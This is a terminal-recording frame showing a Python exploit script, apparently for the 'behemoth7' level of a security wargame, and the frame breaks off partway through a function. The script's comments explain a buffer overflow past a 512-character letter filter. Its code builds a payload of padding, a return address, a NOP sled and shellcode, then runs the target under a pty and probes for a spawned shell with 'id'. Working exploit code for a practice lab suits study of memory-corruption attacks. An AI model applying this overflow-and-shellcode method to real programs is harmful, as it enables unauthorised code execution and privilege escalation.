[31.447414, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, subprocess, sys, time, os, pty, select, tty\r\r\nsc = \u001b[36mopen\u001b[m(\u001b[31m\"/tmp/b7.bin\"\u001b[m, \u001b[31m\"rb\"\u001b[m).read()\u001b[2;38H\u001b[K\u001b[3;1H\u001b[34m# behemoth7: the isalpha filter only walks the first 512 chars (i <= 0x1ff);\u001b[m\u001b[3;77H\u001b[K\u001b[4;1H\u001b[34m# strcpy copies everything. buf = ebp-0x20c -> ret at offset 528.\r\r\n# Payload: 524 letters + BBBB + ret + 2000-byte NOP sled + shellcode: any ret\r\r\n# landing in the sled slides to the sc, so no exact argv address is needed.\r\r\n# Probes run on a raw pty: the execve'd shell does not answer on pipes.\u001b[m\r\r\n\u001b[33massert\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33mnot\u001b[m \u001b[33min\u001b[m sc\r\r\n\u001b[33mdef\u001b[m \u001b[36mpayload_for\u001b[m(addr):\r\r\n    \u001b[33mreturn\u001b[m \u001b[31mb\"A\"\u001b[m * \u001b[31m524\u001b[m + \u001b[31mb\"BBBB\"\u001b[m + struct.pack(\u001b[31m\"<I\"\u001b[m, addr) + \u001b[31mb\"\u001b[m\u001b[35m\\x90\u001b[m\u001b[31m\"\u001b[m * \u001b[31m2000\u001b[m + sc\r\r\n\u001b[33mdef\u001b[m \u001b[36mprobe\u001b[m(addr):\r\r\n    \u001b[33mif\u001b[m \u001b[31mb\"\u001b[m\u001b[35m\\x00\u001b[m\u001b[31m\"\u001b[m \u001b[33min\u001b[m struct.pack(\u001b[31m\"<I\"\u001b[m, addr):\u001b[13;9H\u001b[33mreturn\u001b[m \u001b[36mFalse\u001b[m\r\r\n    pid, fd = pty.fork()\r\r\n    \u001b[33mif\u001b[m pid == \u001b[31m0\u001b[m:\u001b[16;9Hos.execve(\u001b[31mb\"/behemoth/behemoth7\"\u001b[m, [\u001b[31mb\"/behemoth/behemoth7\"\u001b[m, payload_for(addr)], {})\r\r\n    tty.setraw(fd)\r\r\n    time.sleep(\u001b[31m2\u001b[m)\u001b[17C\u001b[34m# the spawned sh swallows input sent too early\u001b[m\r\r\n    os.write(fd, \u001b[31mb\"id\u001b[m\u001b[35m\\n\\n\\n\u001b[m\u001b[31m\"\u001b[m)     \u001b[34m# extra newlines: the first is eaten by the sh\u001b[m\r\r\n    out = \u001b[31mb\"\"\u001b[m\r\r\n    deadline = time.time() + \u001b[31m1.5\u001b[m\r\r\n    \u001b[33mwhile\u001b[m time.time() < deadline:\u001b[23;9Hr, _, _ = select.select([fd], [], [], \u001b[31m0.05\u001b[m)\u001b[24;9H\u001b[33mif\u001b[m r:\u001b[25;13H\u001b[33mtry\u001b[m:\u001b[26;17Hout += os.read(fd, \u001b[31m4096\u001b[m)\u001b[27;13H\u001b[33mexcept\u001b[m \u001b[32mOSError\u001b[m:\u001b[28;17H\u001b[33mbreak\u001b[29;9Hif\u001b[m \u001b[31mb\"uid=\"\u001b[m \u001b[33min\u001b[m out:\u001b[30;13H\u001b[33mbreak\r\r\n\u001b[m    \u001b[33mtry\u001b[m:\u001b[32;9Hos.kill(pid, \u001b[31m9\u001b[m)\r\r\n    \u001b[33mexcept\u001b[m \u001b[32mException\u001b[m:\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
